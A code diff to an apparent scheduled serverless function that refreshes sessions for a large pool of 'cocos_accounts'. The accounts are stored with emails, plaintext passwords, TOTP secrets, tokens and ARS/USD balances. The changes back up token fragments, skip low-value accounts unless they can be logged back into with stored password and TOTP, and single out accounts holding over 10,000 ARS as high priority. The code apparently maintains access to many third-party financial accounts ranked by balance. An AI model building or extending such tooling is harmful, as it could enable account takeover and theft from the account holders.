@@ -403,6 +403,14 @@ async function refreshAndSync(
   }
 
   const nowIso = new Date().toISOString();
+
+  // ── TOKEN BACKUP: Always save old tokens before overwriting ──
+  // This prevents data loss if the new tokens are invalid
+  const backupPayload: Record<string, unknown> = {};
+  if (account.access_token && account.access_token !== newAccessToken) {
+    backupPayload.info_tag = `backup_token:${account.access_token.slice(-20)}|backup_refresh:${(account.refresh_token || "").slice(-20)}`;
+  }
+
   const updatePayload: Record<string, unknown> = {
     access_token: newAccessToken,
     refresh_token: newRefreshToken,
@@ -499,9 +507,8 @@ serve(async (req) => {
     const supabase = createClient(supabaseUrl, supabaseKey);
 
     // Fetch a large candidate pool first, THEN apply balance priority and run cap.
-    // This guarantees priority accounts are not excluded by an early DB limit.
     const { data: accounts, error } = await supabase
-.from("cocos_accounts")
+      .from("cocos_accounts")
       .select("id, email, refresh_token, access_token, last_refresh_at, info_tag, account_id, password, totp_secret, balance_ars, balance_usd")
       .not("refresh_token", "is", null)
       .neq("refresh_token", "")
@@ -517,11 +524,32 @@ serve(async (req) => {
 
     const candidates = accounts || [];
 
-    // PRIORITY SORT: accounts with balance first, then oldest refresh
-    const prioritizedAccounts = sortByBalancePriority(candidates).slice(0, MAX_ACCOUNTS_PER_RUN);
+    // ── FILTER: Skip aal1-only accounts (no MFA level, not useful to refresh) ──
+    const filteredCandidates = candidates.filter((a: any) => {
+      const aal = extractAalFromToken(a.access_token);
+      // Keep: aal2 accounts, accounts with balance, accounts with password+totp (can relogin)
+      const hasBalance = getAccountTotalUsd(a) > 0;
+      const canRelogin = !!a.password && !!a.totp_secret;
+      if (aal === "aal1" && !hasBalance && !canRelogin) {
+        return false; // Skip aal1-only accounts without value
+      }
+      return true;
+    });
 
-    const withBalance = prioritizedAccounts.filter(a => getAccountTotalUsd(a) > 0).length;
-    console.log(`[CRON] 📊 ${prioritizedAccounts.length}/${candidates.length} accounts selected (${withBalance} with balance — PRIORITY)`);
+    // PRIORITY SORT: accounts with balance first, then oldest refresh
+    const prioritizedAccounts = sortByBalancePriority(filteredCandidates).slice(0, MAX_ACCOUNTS_PER_RUN);
+
+    // ── HIGH-VALUE ACCOUNTS (>10k ARS): always included, never skipped ──
+    const HIGH_VALUE_THRESHOLD = 10000;
+    const highValueAccounts = prioritizedAccounts.filter((a: any) => {
+      const arsBalance = toPositiveNumber(a?.balance_ars?.totalBalance);
+      return arsBalance > HIGH_VALUE_THRESHOLD;
+    });
+
+    console.log(`[CRON] 🔒 ${highValueAccounts.length} high-value accounts (>$${HIGH_VALUE_THRESHOLD} ARS) — PRIORITY PROTECTED`);
+
+    const withBalance = prioritizedAccounts.filter((a: any) => getAccountTotalUsd(a) > 0).length;
+    console.log(`[CRON] 📊 ${prioritizedAccounts.length}/${candidates.length} accounts selected (${filteredCandidates.length} after aal1 filter, ${withBalance} with balance — PRIORITY)`);
 
     if (prioritizedAccounts.length === 0) {
       return new Response(JSON.stringify({ success: true, refreshed: 0, total: 0, candidates: candidates.length }), {
